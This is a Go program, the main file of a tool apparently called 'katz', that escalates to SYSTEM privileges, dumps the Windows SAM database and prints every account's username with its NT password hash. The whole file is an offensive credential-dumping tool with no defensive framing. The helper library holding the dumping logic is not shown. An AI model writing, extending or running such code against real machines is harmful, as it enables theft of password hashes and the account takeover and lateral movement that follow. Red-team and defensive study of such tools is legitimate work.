package main

import (
	"fmt"
	"katz/katz/lib"
	"log"
	"katz/katz/style"
)


func main(){
	system, err := lib.GetSystem()
	if err != nil {
		err = fmt.Errorf(style.ErrorTextStyle.Render(err.Error()))
		panic(err)
	}
	// err = lib.InjectToken(system)
	
	err = lib.TestRegAccess(system)
	if err != nil {
		err = fmt.Errorf(style.ErrorTextStyle.Render(err.Error()))
		panic(err)
	}
	info := style.SuccessTextStyle.Render("\nSYSTEM access!")
	log.Println(info)
	acc, err := lib.DumpSAM(system)
	if err != nil {
		err = fmt.Errorf(style.ErrorTextStyle.Render(err.Error()))
		panic(err)
	}
	for _, account := range acc {
		userName := account.Name
		ntHash := account.Nthash
		if len(userName) > 0{
			formatted := fmt.Sprintf(`%s:%s`, userName, ntHash)
			data := style.SuccessTextStyle.Render(formatted)
			fmt.Println(data)
		}


	}
	
}